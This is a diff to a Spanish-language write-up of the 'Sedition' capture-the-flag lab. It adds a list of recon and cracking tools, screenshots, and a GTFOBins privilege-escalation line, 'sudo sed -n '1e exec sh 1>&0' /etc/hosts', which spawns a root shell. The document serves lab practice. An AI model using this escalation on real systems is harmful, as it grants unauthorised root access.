@@ -1,6 +1,14 @@
 # Sedition (TheHackerLabs)
----
 ## ⚙️ Herramientas utilizadas
+- Arp-scan
+- Nmap
+- SMBClient
+- JohnTheRipper
+- RPCClient
+- CrackStation
+- GTFObins
+
+
 ## Reconocimiento
 ### Arp-scan
 ```bash 
@@ -207,12 +215,15 @@ sudo -l
 
 Buscamos en GTFObins:
 
+<img width="547" height="135" alt="Captura de pantalla 2025-07-14 184446" src="https://github.com/user-attachments/assets/df927c12-d817-48e0-bfe6-6959bffc0903" /><br>
 
-
-Lanzamos:
+Lanzamos el comando:
 ```bash
 sudo sed -n '1e exec sh 1>&0' /etc/hosts
 ```
+
+<img width="399" height="55" alt="Captura de pantalla 2025-07-14 184446" src="https://github.com/user-attachments/assets/ba1e37d4-1088-4f78-9262-a156c1b2aa5f" /><br>
+
 
 ## Flags
 Flag usuario:
